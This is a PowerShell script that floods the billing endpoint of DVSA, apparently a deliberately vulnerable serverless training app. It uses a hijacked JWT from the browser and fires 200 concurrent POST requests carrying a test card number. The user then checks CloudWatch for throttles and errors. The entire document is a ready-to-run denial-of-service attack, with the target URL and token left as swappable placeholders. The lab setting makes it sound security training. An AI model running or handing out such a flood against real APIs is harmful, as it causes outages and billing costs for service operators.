# ============================================================
# DVSA Billing Endpoint Flood Script
# ============================================================

# Step 1: Set your variables
# Replace these with your actual values before running

$API      = "YOUR-API-URL-HERE"         # e.g. https://XXXX.execute-api.us-east-1.amazonaws.com/dvsa/order
$TOKEN    = "YOUR-JWT-TOKEN-HERE"       # Get from browser DevTools F12 → Network → Authorization header
$ORDER_ID = "YOUR-ORDER-ID-HERE"        # Get from a real order placed on the DVSA website

# Step 2: Confirm variables are set
Write-Host "API:          $API"
Write-Host "Token length: $($TOKEN.Length)"
Write-Host "Order ID:     $ORDER_ID"
Write-Host ""

# Step 3: Run the flood attack (200 concurrent requests)
Write-Host "Starting DoS attack - sending 200 concurrent requests..."
Write-Host "Check CloudWatch metrics immediately after running!"
Write-Host ""

$jobs = @()

for ($i = 1; $i -le 200; $i++) {
    $job = Start-Job -ScriptBlock {
        param($a, $t, $o)
        try {
            Invoke-WebRequest `
                -Uri $a `
                -Method POST `
                -Headers @{
                    "Content-Type"  = "application/json"
                    "authorization" = $t
                } `
                -Body "{`"action`":`"billing`",`"order-id`":`"$o`",`"data`":{`"ccn`":`"4242424242424242`",`"exp`":`"12/26`",`"cvv`":`"123`"}}" `
                -UseBasicParsing | Out-Null
        } catch {}
    } -ArgumentList $API, $TOKEN, $ORDER_ID

    $jobs += $job
}

Write-Host "Jobs launched: $($jobs.Count)"
Write-Host "Waiting for jobs to complete..."

$jobs | Wait-Job | Out-Null
$jobs | Remove-Job

Write-Host ""
Write-Host "Attack finished. 200 requests sent."
Write-Host "Now check CloudWatch → Lambda → DVSA-ORDER-BILLING → Invocations/Throttles/Errors/ConcurrentExecutions"
